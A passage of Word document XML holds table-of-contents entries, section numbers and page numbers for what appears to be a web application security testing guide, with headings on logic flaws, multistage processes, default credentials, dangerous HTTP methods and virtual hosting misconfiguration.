            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104357 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7D856278" w14:textId="0E5EF24F" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104358" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.8.3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Other tests</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104358 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="011F9E6B" w14:textId="1269886E" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104359" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.9</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Logic Flaws</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104359 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="350D160F" w14:textId="6889B404" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104360" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.9.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Identify the Key Attack Surface</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104360 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="52141737" w14:textId="5B030069" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104361" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.9.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Multistage Processes</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104361 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="67CB6F2F" w14:textId="65637275" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104362" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.9.3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Handling of Incomplete Input</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104362 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="02754A46" w14:textId="2AB172DB" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104363" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.10</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Shared Hosting Vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104363 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="68AF1DFE" w14:textId="5CA58FB9" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104364" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.11</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Application Server Vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104364 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="211E8CD1" w14:textId="29177EA0" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104365" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.11.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Default Credentials</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104365 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2C0CFBDA" w14:textId="745D0C9A" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104366" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.1.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Dangerous HTTP Methods</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104366 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0926B071" w14:textId="26339C91" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104367" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.1.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Proxy Functionality</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104367 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2C4B9527" w14:textId="1533EDBD" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104368" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.1.3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Virtual Hosting Misconfiguration</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104368 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6AA5B230" w14:textId="48AB3577" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104369" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.1.4</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
